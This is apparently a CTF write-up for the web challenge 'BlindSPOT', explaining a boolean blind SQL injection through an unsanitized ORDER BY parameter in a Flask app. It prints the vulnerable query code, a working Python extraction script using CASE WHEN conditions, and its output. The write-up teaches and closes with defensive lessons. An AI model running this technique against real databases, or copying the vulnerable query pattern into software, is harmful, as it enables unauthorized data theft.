---
title: "ImaginaryCTF 2026 - BlindSPOT (Web)"
date: 2026-04-05 15:00:00 +0900
categories: [CTF, Web]
tags: [sqli, blind-sql-injection, python, ctf-writeup]
---

## Challenge Info

| Category | Difficulty | Solves | Points |
|----------|-----------|--------|--------|
| Web      | Medium    | 42     | 389    |

> "Can you see what I can't?"
>
> `http://blindspot.chal.imaginaryctf.org`

Attachments: `app.py`

## Overview

We are given a simple Flask application that has a login page and a search feature. The flag is stored in the `secrets` table, and the search endpoint is vulnerable to blind SQL injection through the `order` parameter.

## Source Code Analysis

The provided `app.py` reveals the core vulnerability:

```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    order = request.args.get('order', 'id')
    
    # "sanitized" lol
    query = query.replace("'", "''")
    
    cur = db.execute(
        f"SELECT id, title, content FROM posts WHERE title LIKE '%{query}%' ORDER BY {order}"
    )
    results = cur.fetchall()
    return render_template('search.html', results=results)
```

The `query` parameter has basic escaping (single quote doubling), but the `order` parameter is directly interpolated into the SQL query with **no sanitization at all**. Classic ORDER BY injection.

## Exploitation

### Step 1: Confirming the Injection

First, confirm that we can control the ORDER BY clause:

```
GET /search?q=test&order=id       -> results sorted by id (ascending)
GET /search?q=test&order=id DESC  -> results sorted by id (descending)
```

The order changes, confirming the injection point.

### Step 2: Boolean-based Blind SQLi via ORDER BY

We can use a `CASE` expression inside `ORDER BY` to leak data one character at a time. The idea is:

```sql
ORDER BY (CASE WHEN (condition) THEN id ELSE title END)
```

If the condition is **true**, results are sorted by `id` (numeric order). If **false**, they are sorted by `title` (alphabetical order). By observing which order the results come back in, we can determine whether our condition evaluated to true or false.

### Step 3: Extracting the Flag

The schema shows the flag is in `secrets.value` where `secrets.key = 'flag'`.

```python
import requests
import string

URL = "http://blindspot.chal.imaginaryctf.org/search"
CHARSET = string.printable
flag = ""

def check(condition):
    payload = f"(CASE WHEN ({condition}) THEN id ELSE title END)"
    r = requests.get(URL, params={"q": "a", "order": payload})
    # When sorted by id, post #1 appears first
    return b'Post #1' in r.content[:500]

# Get flag length first
for length in range(1, 100):
    if check(f"(SELECT LENGTH(value) FROM secrets WHERE key='flag')={length}"):
        print(f"[+] Flag length: {length}")
        break

# Extract character by character
for i in range(1, length + 1):
    for c in CHARSET:
        cond = f"(SELECT SUBSTR(value,{i},1) FROM secrets WHERE key='flag')='{c}'"
        if check(cond):
            flag += c
            print(f"[+] Flag so far: {flag}")
            break

print(f"[*] Flag: {flag}")
```

### Step 4: Running the Exploit

```
$ python3 exploit.py
[+] Flag length: 38
[+] Flag so far: i
[+] Flag so far: ic
[+] Flag so far: ict
[+] Flag so far: ictf
[+] Flag so far: ictf{
[+] Flag so far: ictf{b
...
[+] Flag so far: ictf{bl1nd_sp0t_in_th3_0rd3r_bY_c14us3}
[*] Flag: ictf{bl1nd_sp0t_in_th3_0rd3r_bY_c14us3}
```

## Flag

```
ictf{bl1nd_sp0t_in_th3_0rd3r_bY_c14us3}
```

## Takeaways

- Always parameterize **every** part of a SQL query, not just the `WHERE` clause. `ORDER BY` injection is a commonly overlooked attack surface.
- Single-quote escaping alone is not sufficient sanitization, and it doesn't help at all when the injection point doesn't require quotes (like column names in `ORDER BY`).
- Boolean-based blind SQLi via `CASE WHEN` in `ORDER BY` is a reliable technique when you can observe differences in response ordering.
